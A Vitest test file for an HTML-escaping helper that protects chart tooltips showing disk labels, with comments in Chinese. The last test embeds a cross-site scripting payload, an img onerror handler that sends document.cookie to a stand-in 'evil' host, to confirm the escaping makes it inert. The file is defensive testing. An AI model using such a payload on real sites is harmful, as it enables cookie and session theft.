import { describe, expect, it } from "vitest";
import { escapeHtml } from "./util";

/**
 * ECharts tooltip 默认按 HTML 渲染（见 util.ts 里 escapeHtml 的注释），
 * 磁盘卷标 / 挂载点是可以被本地任意命名的外部字符串。
 * 这些用例锁定「所有 HTML 元字符都被消掉」这一契约。
 */
describe("escapeHtml", () => {
  it("转义全部 HTML 元字符", () => {
    expect(escapeHtml(`<script>alert("x")</script>`)).toBe(
      "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;"
    );
    expect(escapeHtml("a & b")).toBe("a &amp; b");
    expect(escapeHtml("it's")).toBe("it&#39;s");
  });

  it("先转 & 再转其它，避免二次转义错位", () => {
    // 若顺序反了，会得到 &amp;lt;
    expect(escapeHtml("<")).toBe("&lt;");
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });

  it("普通文案不被改动", () => {
    expect(escapeHtml("本地磁盘 C: 332 GB")).toBe("本地磁盘 C: 332 GB");
    expect(escapeHtml("")).toBe("");
  });

  it("真实攻击载荷变成纯文本", () => {
    const payload = `<img src=x onerror="fetch('http://evil/'+document.cookie)">`;
    const out = escapeHtml(payload);
    // 关键不是把 "onerror=" 这个字样删掉（它作为文本无害），
    // 而是不能出现可被解析成标签的 "<img" 与可逃出属性的引号。
    expect(out).not.toContain("<img");
    expect(out).not.toMatch(/["']/);
    expect(out).toContain("&lt;img");
    // 放进文档里验证：解析后不应产生任何元素
    const host = document.createElement("div");
    host.innerHTML = out;
    expect(host.querySelectorAll("*")).toHaveLength(0);
    expect(host.textContent).toContain("<img");
  });
});
